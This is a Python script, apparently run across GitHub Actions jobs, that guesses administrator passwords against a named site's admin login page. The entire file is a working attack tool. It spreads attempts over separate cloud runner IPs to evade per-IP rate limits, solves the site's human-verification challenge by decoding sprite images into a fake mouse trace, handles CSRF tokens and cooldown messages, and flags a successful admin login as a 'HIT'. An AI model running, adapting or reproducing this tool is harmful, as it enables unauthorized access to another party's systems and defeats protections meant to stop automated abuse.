#!/usr/bin/env python3
"""GitHub Actions bucket probe for https://1poa.org/admin/login.
Runs from the runner's OWN Azure egress (no upstream proxy) so each job is one
real source-IP bucket. One real password evaluation per invocation.
Reads COMBO env: "<identifier>|<password>"  (password may be empty).
Prints one machine-readable line:  ==RESULT== {json}
HTTPS/443 only. Never touches TCP/25.
"""
import os, sys, json, subprocess, re, time

BASE = "https://1poa.org"
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from pngdec import read_png


def _env():
    return {k: v for k, v in os.environ.items()
            if k.lower() not in ("http_proxy", "https_proxy", "all_proxy")}


def curl(args, timeout="25", tries=3):
    last = None
    for _ in range(tries):
        cmd = ["curl", "-sS", "-k", "-m", timeout, "--connect-timeout", "10", "-4"]
        p = subprocess.run(cmd + args, capture_output=True, text=True, env=_env())
        last = p
        if p.returncode == 0:
            return p
        time.sleep(0.6)
    return last


def egress_ip():
    for u in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://1.1.1.1/cdn-cgi/trace"):
        p = curl([u], timeout="15", tries=1)
        t = (p.stdout or "").strip()
        if p and p.returncode == 0 and t:
            m = re.search(r"ip=([0-9.]+)", t)
            if m:
                return m.group(1)
            if re.match(r"^[0-9.]+$", t):
                return t
            if "ip=" in t:
                return t.split("ip=")[1].split("\n")[0].strip()
    return None


def _csrf(html):
    m = re.search(r'name="csrf-token" content="([^"]+)"', html or "")
    if m:
        return m.group(1)
    m = re.search(r'name="_csrf_token"\s+value="([^"]+)"', html or "")
    return m.group(1) if m else None


def cooldown_of(html):
    m = re.search(r"请等待\s*(\d+)\s*秒", html or "")
    return int(m.group(1)) if m else 0


def png_ok(fn):
    if not os.path.exists(fn) or os.path.getsize(fn) < 1000:
        return False
    d = open(fn, "rb").read()
    return d[:8] == b"\x89PNG\r\n\x1a\n" and b"IEND" in d[-16:]


def solve(tag, ident, work):
    os.makedirs(work, exist_ok=True)
    jar = os.path.join(work, "jar.txt")
    for f in os.listdir(work):
        if f.endswith(".png") or f.endswith(".html"):
            os.remove(os.path.join(work, f))
    p = curl(["-c", jar, "-b", jar, BASE + "/admin/login",
              "-o", os.path.join(work, "lg.html"), "-D", os.path.join(work, "lg_hdr.txt")])
    html = open(os.path.join(work, "lg.html"), encoding="utf-8", errors="replace").read() \
        if os.path.exists(os.path.join(work, "lg.html")) else ""
    csrf = _csrf(html)
    if not csrf:
        return None, {"stage": "get_login", "size": len(html),
                      "err": (p.stderr or "")[:160] if p else ""}, jar
    H = ["-H", f"X-CSRF-Token: {csrf}", "-H", "Content-Type: application/json",
         "-H", "Accept: application/json", "-H", "X-Requested-With: XMLHttpRequest",
         "-H", f"Origin: {BASE}", "-H", f"Referer: {BASE}/admin/login"]
    info = {"stage": "challenge"}
    cf = None
    for attempt in range(3):
        p = curl(["-b", jar, "-c", jar, "-X", "POST", BASE + "/admin/human-verification/challenge",
                  "--data-binary", json.dumps({"scope": "admin.admin_login_post", "target": ident})] + H)
        out = (p.stdout or "") if p else ""
        try:
            cf = json.loads(out)
        except Exception:
            cf = None
        if cf and "frames" in cf:
            break
        info["challenge_resp"] = out[:160]
        m = re.search(r"请等待\s*(\d+)\s*秒", out)
        if "429" in out or m:
            time.sleep(min(int(m.group(1)) + 1, 60) if m else 5)
        else:
            time.sleep(2)
    if not cf or "frames" not in cf:
        return None, info, jar
    info["challenge"] = "ok"
    F = cf["frames"]; cfg = cf["config"]
    files = []
    for k, u in enumerate(F["urls"]):
        fn = os.path.join(work, f"sprite{k}.png")
        okk = False
        for _ in range(6):
            uu = u if u.startswith("http") else BASE + u
            curl(["-b", jar, uu, "-o", fn])
            if png_ok(fn):
                okk = True
                break
            time.sleep(0.8)
        if not okk:
            info["sprite_fail"] = k
            return None, info, jar
        files.append(fn)
    tw, th, cols, bs = F["width"], F["height"], F["columns"], F["batch_size"]
    cnt = F["count"]; fms = F["frame_ms"]
    scx = cfg["width"] / tw; scy = cfg["height"] / th
    sheets = {k: read_png(fn) for k, fn in enumerate(files)}

    def centroid(i, thr):
        k = i // bs; idx = i % bs
        if k not in sheets:
            return None
        W, H2, rows, plte = sheets[k]
        r = idx // cols; col = idx % cols; x0 = col * tw; y0 = r * th
        sx = sy = n = 0
        for y in range(y0, min(y0 + th, H2)):
            row = rows[y]
            for x in range(x0, min(x0 + tw, W)):
                if row[x] >= thr:
                    sx += x - x0; sy += y - y0; n += 1
        if n == 0:
            return None
        return (sx / n * scx, sy / n * scy)

    def build(thr):
        tr = []
        for i in range(cnt):
            c2 = centroid(i, thr)
            if c2 is None:
                continue
            tr.append([round(c2[0], 2), round(c2[1], 2), round(i * fms)])
        return tr

    thr = 14
    trace = build(thr)
    if len(trace) < cnt * 0.6:
        best = (thr, trace)
        for t2 in [13, 12, 11, 10]:
            tr2 = build(t2)
            if len(tr2) > len(best[1]):
                best = (t2, tr2)
        thr, trace = best
    info["trace_len"] = len(trace)
    if len(trace) < 30:
        info["trace_short"] = True
        return None, info, jar
    ch = cf["challenge"]; start = cf.get("start")
    if start:
        for i in range(min(8, len(trace))):
            if (trace[i][0] - start[0]) ** 2 + (trace[i][1] - start[1]) ** 2 < 16:
                trace[i][0], trace[i][1] = round(start[0], 2), round(start[1], 2)
    vb = {"challenge": ch, "trace": trace, "target": ident, "scope": "admin.admin_login_post"}
    tok = None
    for attempt in range(3):
        p = curl(["-b", jar, "-c", jar, "-X", "POST", BASE + "/admin/human-verification/verify",
                  "--data-binary", json.dumps(vb)] + H)
        body = ((p.stdout or "").strip() if p else "")
        info["verify"] = body[:120]
        try:
            vj = json.loads(body)
            if vj.get("ok") and vj.get("token"):
                tok = vj["token"]
                break
        except Exception:
            pass
        time.sleep(1.5)
    return tok, info, jar


def login(jar, csrf, token, ident, pw, work):
    lh = ["-b", jar, "-c", jar,
          "-H", f"X-CSRF-Token: {csrf}", "-H", f"X-Human-Token: {token}",
          "-H", "Content-Type: application/x-www-form-urlencoded",
          "-H", "Accept: application/json, text/plain, */*", "-H", "X-Requested-With: XMLHttpRequest",
          "-H", f"Origin: {BASE}", "-H", f"Referer: {BASE}/admin/login"]
    hp = os.path.join(work, "lg_hdr2.txt"); bp = os.path.join(work, "lg_body.txt")
    post = ["-X", "POST", BASE + "/admin/login?next=/admin/",
            "--data-urlencode", "_csrf_token=" + csrf,
            "--data-urlencode", "identifier=" + ident,
            "--data-urlencode", "password=" + pw,
            "-D", hp, "-o", bp]
    p = curl(post + lh, timeout="30")
    hdr = open(hp, encoding="latin1").read() if os.path.exists(hp) else ""
    bd = open(bp, encoding="utf-8", errors="replace").read() if os.path.exists(bp) else ""
    code_m = re.match(r"HTTP/[\d.]+\s+(\d+)", hdr)
    loc = (re.search(r"(?im)^location:\s*(\S+)", hdr) or [None, ""])[1]
    ra = (re.search(r"(?im)^retry-after:\s*(\d+)", hdr) or [None, None])[1]
    return {"status": int(code_m.group(1)) if code_m else 0, "loc": loc,
            "retry_after": ra, "body": bd[:240], "rc": p.returncode if p else None}


def flash(jar):
    p = curl(["-b", jar, "-c", jar, BASE + "/admin/login"])
    b = (p.stdout or "") if p else ""
    return re.findall(r"管理员账号或密码错误|已触发冷却[^<]{0,16}|请等待\s*\d+\s*秒|登录请求受限", b)[:4]


def check_admin(jar):
    p = curl(["-b", jar, "-o", os.devnull, "-w", "%{http_code} %{redirect_url}", BASE + "/admin/"])
    return (p.stdout or "").strip() if p else ""


def main():
    combo = os.environ.get("COMBO", "").strip()
    if "|" not in combo:
        print("==RESULT== " + json.dumps({"error": "bad COMBO", "combo": combo}))
        return
    ident, pw = combo.split("|", 1)
    work = os.path.join(HERE, "work_" + re.sub(r"[^A-Za-z0-9_.-]", "_", combo)[:60])
    rec = {"ident": ident, "pwlen": len(pw), "pw_mode": os.environ.get("PWMODE", ""),
           "egress": egress_ip(), "combo": combo}
    t0 = time.time()
    # initial page state
    p = curl([BASE + "/admin/login"], timeout="20", tries=2)
    pre = (p.stdout or "") if p else ""
    rec["pre_cd"] = cooldown_of(pre)
    rec["pre_size"] = len(pre)
    if rec["pre_size"] < 3000:
        rec["result"] = "egress_fail_page"
        rec["elapsed"] = round(time.time() - t0, 1)
        print("==RESULT== " + json.dumps(rec, ensure_ascii=False)); return
    if rec["pre_cd"] > 0:
        rec["result"] = "skip_cooldown"
        rec["elapsed"] = round(time.time() - t0, 1)
        print("==RESULT== " + json.dumps(rec, ensure_ascii=False)); return
    tok, info, jar = solve(ident, ident, work)
    rec["solve"] = bool(tok)
    rec["solve_info"] = json.dumps(info, ensure_ascii=False)[:240]
    if not tok:
        rec["result"] = "solve_fail"
        rec["elapsed"] = round(time.time() - t0, 1)
        print("==RESULT== " + json.dumps(rec, ensure_ascii=False)); return
    p = curl(["-b", jar, "-c", jar, BASE + "/admin/login"])
    csrf = _csrf(p.stdout or "") if p else None
    if not csrf:
        rec["result"] = "csrf_fail"
        rec["elapsed"] = round(time.time() - t0, 1)
        print("==RESULT== " + json.dumps(rec, ensure_ascii=False)); return
    r = login(jar, csrf, tok, ident, pw, work)
    rec["login"] = r
    rec["flash_after"] = flash(jar)
    loc = r.get("loc") or ""
    if r["status"] == 429 or (r.get("retry_after") not in (None, "", "0")):
        rec["result"] = "cooldown"
    elif r["status"] == 302 and "/admin/login" not in loc:
        ac = check_admin(jar)
        rec["admin_check"] = ac
        rec["result"] = "HIT" if ac.startswith("200") else "wrongpw_adminblocked"
    elif r["status"] == 302:
        rec["result"] = "wrongpw"
    elif r["status"] == 200:
        rec["result"] = "http200_odd"
    else:
        rec["result"] = "unexpected"
    rec["elapsed"] = round(time.time() - t0, 1)
    print("==RESULT== " + json.dumps(rec, ensure_ascii=False))


if __name__ == "__main__":
    main()
